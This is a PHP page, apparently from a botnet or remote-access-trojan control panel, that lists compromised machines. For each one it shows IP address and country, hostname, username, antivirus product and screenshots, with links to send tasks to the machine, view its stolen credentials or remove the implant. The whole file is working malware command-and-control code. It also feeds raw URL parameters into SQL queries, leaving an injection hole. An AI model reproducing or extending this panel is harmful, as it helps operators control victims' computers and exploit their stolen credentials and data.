<?php
    
   session_start();

   error_reporting( 0 );

   if ( !( isset( $_SESSION['Name'] ) ) )
   {
      header( "Location: login.php" );
      exit;
   }

   include( "Header.php" );
   include( "Cfg/Config.php" );
   include( "Cfg/Options.php" );
   include( "Cfg/Sync.php" );
   include( "Functions.php" );

   if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
   {
      echo "SQL connection filed, check host, name, login and password";
      die;
   }

   function aGetCountryIndex( $ip )
   {
      include_once( "F.st/geo_ip.php" );
      $geoip = geo_ip::getInstance( "F.st/geo_ip.dat" );
      return $geoip -> lookupCountryCode( $ip );
   }

   mysql_select_db( $conf['dbname'] );

   if ( $_GET["f"] )
   { 
      $f = ( $_GET["f"] );
   }
   else
   {
      $f = 0;
   }

   if ( $_GET["sort"] == "" )
   {
      $so = "id";
      $J = "id";
   }
   else
   {
      $so = $_GET["sort"];
      $J = $_GET["sort"];
   }

   if ( $_GET["show"] == all )
   {     
      $all = mysql_query( "SELECT * FROM units" );
      $result = mysql_query( "SELECT * FROM units ORDER BY $J DESC LIMIT $f, 100" );
   
   }
   else
   {
      $all = mysql_query( "SELECT * FROM units WHERE online > " . ( time() - $options["sync_time"] * 60 ) );
      $result = mysql_query( "SELECT * FROM units WHERE online > " . ( time() - $options["sync_time"] * 60 ) . " ORDER BY $J DESC LIMIT $f, 100" );
   }  
            
   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 1px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $lang["_001"] . $_SESSION['Name'] . $lang["_003"] . GetUnitsCount() . $lang["_004"] . GetOnlineUnitsCount() . $lang["_005"] .
                  "</font>
               </div>
            </td>
         </tr>
      </table>";

   sTable();

   if (GetOnlineUnitsCount() > 0 || $_GET["show"] == all)
   {
      echo "<div align = center> 
      <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
         <tr>
            <td><div align = center> <a href=\"Show_Units.php?sort=id" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0022"] . ":</div></td>";

            if ( $options["show_screen"] == "1" )
            {
               echo "<td><div align = center>&nbsp;" . $lang["0023"] . ":</div></td>";
            }
            
            echo "<td><div align = center> <a href=\"Show_Units.php?sort=sid" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0024"] . ":</div></td>";

            if ( $options["show_il"] == "1" )
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=il" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0025"] . ":</div></td>";
            }

            echo "
            <td><div align = center> <a href=\"Show_Units.php?sort=country" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0014"]  . ":</div></td>
            <td><div align = center> <a href=\"Show_Units.php?sort=version" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0026"]  . ":</div></td>";

            if ( $options["show_domain"] == "1" )
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=dm" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0027"] . ":</div></td>";
            }
            
            if ( $options["show_hostname"] == "1" )
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=pc" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0028"] . ":</div></td>";
            }

            if ( $options["show_username"] == "1" )
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=un" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0029"] . ":</div></td>";
            }

            if ( $options["show_av"] == "1" )
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=av" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0030"] .":</div></td>";
            }

            echo "                                   
            <td><div align = center> <a href=\"Show_Units.php?sort=online" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0031"] . ":</div></td>";

            
            if ( $options["show_reg"] == "1" )
            {
               echo "<td><div align = center> <a href=\"Show_Units.php?sort=reg" . "&f=" . $_GET["f"] . "&show=" . $_GET["show"] . "\"><img src=\"Images\ic_sort.png\"></a>&nbsp;" . $lang["0032"] . ":</div></td>";
            }

            
            if ( $_SESSION['Name'] != "OBSERVER" )
            {
               echo "<td>&nbsp;" . $lang["0033"] . ":</td>";
            }

      echo "</tr>";

      while ( $row = mysql_fetch_array( $result ) )
      { 
         $gb = GetBG();

         if ( time() - $row['online'] < ( $options["sync_time"] * 60 ) )
         {
            $ico = "\\Online.png";
         }
         else
         {
            $ico = "\\Offline.png";
         }

         if ( $row['lv']  == 1)
         {
            $level = "<font color=red>" . $lang["0150"] . "</font>";
         }
         else
         {
            $level = $lang["0151"];
         }
         
         if ( $options["show_screen"] == "1" )
         {
            if ( ( file_exists( 'Screen/' . $row['id'] . '.jpg' ) ) || ( file_exists( 'Screen\\' . $row['id'] . '.jpg' ) ) )      
            {   
               $srceen = "<div align=center><a href=Screen\\" . $row['id'] . ".jpg><img src=\"Screen\\" .$row['id'] . ".jpg\" width=107 height=60></a></div>";    
            }
         }

         echo "<tr height=\"80\">
               <td bgcolor = " . $gb . ">" . "<div align = center><img src=\"Images" . $ico .  "\"></div>" . "</td>";
               
         if ( $options["show_screen"] == "1" )
         {
            echo "<td bgcolor = " . $gb . ">" .  $srceen . "</td>";
         }

         echo "<td bgcolor = " . $gb . ">" . 
                  "<table>" . 
                     "<tr>" . "<td>" . "<img src=\"Images\AR.png\"> " . $lang["0034"] . ": " . "</td>" . "<td>" . "<a href=\"Unitinfo.php?id=" . $row['id'] . "\">" . $row['id'] . "</a>" . "</td>" . "</tr>" .
                     "<tr>" . "<td>" . "<img src=\"Images\AR.png\"> " . $lang["0035"] . ": " . "</td>" . "<td>" . "<a href=\"Unitinfo.php?id=" . $row['id'] . "\">" . $row['sid'] . "</a>" . "</td>" . "</tr>" .
                     "<tr>" . "<td>" . "<img src=\"Images\AR.png\"> " . $lang["0036"] . ": " . "</td>" . "<td>" . $level . "</td>" . "</tr>" .
                  "</table>" .
               "</td>";

         if ( $options["show_il"] == "1" )
         {
            echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\Version.png\"> " . $level . "</div></td>";
         }

         echo "<td bgcolor = " . $gb . "><table border=\"0\" width=\"100%\">
                  <tr>
                     <td rowspan=\"2\" width=\"120\">";
         
         
                  if (aGetCountryIndex($row['ip']) <> "?")
                  {
                     echo "&nbsp;<img src=\"Images\Flags\\" . strtolower( aGetCountryIndex($row['ip']) ) .  ".png\" height=\"60\" width=\"100\">"; 
                  }
                  else
                  {
                     echo "&nbsp;<img src=\"Images\Flags\\" . "unk" .  ".png\"height=\"60\" width=\"100\">"; 
                  }
         
         echo "</td>
               <td>" . $row['country'] . " (" . aGetCountryIndex($row['ip']) . ")</td></td>
   
         </tr>
         <tr><td>" . $row['ip'] . "</td></tr>
         
         </table></td>";

         echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\Version.png\"> " . $row['version'] . "</div></td>";

         if ( $options["show_domain"] == "1" )
         {
            echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\PC.png\"> " . substr( $row['dm'], 0, 15 ) . "</div></td>";
         }
                  
         if ( $options["show_hostname"] == "1" )
         {
            echo "<td bgcolor = " . $gb . ">" . 
                        "<table>" . 
                           "<tr>" . "<td>" . "<img src=\"Images\PC.png\"> " . $lang["0037"] . ": " . "</td>" . "<td>" . substr( $row['pc'], 0, 15 ) . "</td>" . "</tr>" .
                           "<tr>" . "<td>" . "<img src=\"Images\User.png\"> " . $lang["0038"] . ": " . "</td>" . "<td>" . substr( $row['un'], 0, 15 ) . " [" . substr( $row['ar'], 0, 15 ) . "]" . "</td>" . "</tr>" .
                           "<tr>" . "<td>" . "<img src=\"Images\OS.png\"> " . $lang["0039"] . ": " . "</td>" . "<td>" . $row['os'] . " [" . $row['arch'] . "]" . "</td>" . "</tr>" .
                        "</table>" . 
                     "</td>";
         }

         if ( $options["show_username"] == "1" )
         {
            echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\User.png\"> " . substr( $row['un'], 0, 15 ) . " [" . $row['ar'] . "]" . "</div></td>";
         }

         if ( $options["show_av"] == "1" )
         {
            echo "<td bgcolor = " . $gb . "><div align = left>" . "&nbsp;<img src=\"Images\AV.png\"> " . $row['av'] . "</div></td>";
         }

         echo "<td bgcolor = " . $gb . "> <div align = center>";
                  
         if ( ( time() - $row['online'] ) < ($options["sync_time"] * 60 ) )
         {
            echo "&nbsp;<img src=\"Images\Time.png\"> " . date( "i", ( time() - $row['online'] ) ) . $lang["0137"] . date( "s", ( time() - $row['online'] ) ) . " " . $lang["0136"]; 
         }
         else
         {
            echo "&nbsp;<img src=\"Images\Time.png\"> " . date( "d|m|Y H:i", ( $row['online'] ) ) ;
         }

         echo "   </div>
               </td>";

         if ( $options["show_reg"] == "1" )
         {
            echo  "<td bgcolor = " . $gb. "><div align = center>" . "&nbsp;<img src=\"Images\Time.png\"> " . date( "d|m|Y H:i", ( $row['reg'] ) ) . "</div></td>";
         }

         if ( $_SESSION['Name'] != "OBSERVER" )
         {
            echo  "<td bgcolor = " . $gb. ">" . 
            "<div align = center><table>" . 
               "<tr><td><img src=\"Images\Add.png\"> " . "<a href=\"Make_Task.php?count=1&unit=" . $row['id'] . "\">" . $lang["0040"] . "</a></td></tr>" . 
               "<tr><td><img src=\"Images\Cred.png\"> <a href=\"Show_Cred.php?showid=" . $row['id'] . "\">" . $lang["0041"] . "</a></td></tr>" . 
               "<tr><td><img src=\"Images\Rem.png\"> " . "<a href=\"Make_Task.php?rem=1&count=1&unit=" . $row['id'] . "\">" . $lang["0042"]  . "</a></td></tr>" . 
            "</table></div></td>";
         }

         echo "</tr>";
      }  

      echo "   </table>
            </div>";

      echo " <div align = center><table width=\"98%\">
                  <tr>
                     <td>";

      if ( $_GET["show"] == all )
      {
         $sa = "&show=all";
      }

      while ( mysql_num_rows( $all ) > $i0 )
      {    
         if ( mysql_num_rows( $all ) > $i0 ) 
         { 
            $total_pages++; 
         }

         $i0 = $i0 + 100;
      }

      $current_page = ($f / 100) + 1;

      if ($total_pages > 1)
      {
         echo "<div class=\"bblock1\"> " . $lang["0043"] . ": " . $current_page . "/" . $total_pages . "</div>";

         while ( mysql_num_rows( $all ) > $i )
         {    
            if ( mysql_num_rows( $all ) > $i ) 
            { 
               $c++;
               
               if ( mysql_num_rows( $all ) > 100 ) 
               {

                     if ( ($current_page - 15) < ( ($i / 100) + 1  ) && ($current_page + 15) > ( ($i / 100) + 1) && ( ($i / 100) + 1) <> $current_page ) 
                        echo "<div class=\"bblock1\"><a href=\"Show_Units.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";

                     if ( ( ($i / 100) + 1  ) == $current_page )
                        echo "<div class=\"bblock2\"><a href=\"Show_Units.php?sort=" . $so . "&f=" . $i . $sa . "\">" . $c . "</a></div>";
               }
            }

            $i = $i + 100;
         }
      }

      echo "           
         </td>
            </tr>
               </table>
            </div>";
   }
   else 
   {
      echo "<table border=\"0\" width=\"100%\" height=\"300\">
               <tr>
                  <td>
                     <div align = center>" . $lang["0154"] . "</div>
                  </td>
               </tr>
            </table>";
   }

   include( "Footer.php" );

   mysql_close();
?>